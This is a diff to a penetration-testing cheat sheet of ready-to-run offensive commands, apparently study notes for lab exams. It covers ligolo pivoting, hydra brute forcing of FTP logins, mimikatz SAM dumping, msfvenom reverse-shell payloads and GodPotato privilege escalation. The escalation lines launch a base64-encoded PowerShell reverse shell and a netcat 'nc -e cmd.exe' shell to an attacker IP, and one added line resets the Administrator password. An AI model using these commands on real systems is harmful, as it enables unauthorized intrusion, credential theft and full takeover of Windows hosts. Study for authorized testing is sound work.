@@ -714,6 +714,9 @@ lsadump::lsa /patch #both these dump SAM
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 
+#Adding subnet to ligolo interface - Kali linux
+sudo ip r add <subnet> dev ligolo
+
 #Kali machine - Attacker machine
 ./proxy -laddr 0.0.0.0:9001 -selfcert
 
@@ -725,8 +728,7 @@ session #select host
 ifconfig #Notedown the internal network's subnet
 start #after adding relevent subnet to ligolo interface
 
-#Adding subnet to ligolo interface - Kali linux
-sudo ip r add <subnet> dev ligolo
+
 
 ```
 
@@ -798,7 +800,7 @@ nmap -p21 --script=<name> <IP>
 
 #bruteforce
 hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ssh://192.168.102.240
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://IP
 
 # Check for vulnerabilities associated with the identified version.
 
@@ -1279,10 +1281,15 @@ searchsploit -m windows/remote/46697.py #Copies the exploit to the current locat
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 
+#powershell revshell
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.49.126 lport=445 >task.bat
+
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+
+
 ```
 
 ### One Liners
@@ -1386,6 +1393,9 @@ GodPotato.exe -cmd "cmd /c whoami"
 GodPotato.exe -cmd "shell.exe"
 #god potato powershell base64 encoded port 8888
 .\godpotato.exe -cmd "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+#change admin password 
+GodPotato-NET4.exe -cmd "cmd /c net user Administrator Password@123"
 
 #use netcat for god potato rev shell
 .\godpotato.exe -cmd "C:\Users\Public\nc.exe -e cmd.exe 192.168.45.215 8888"
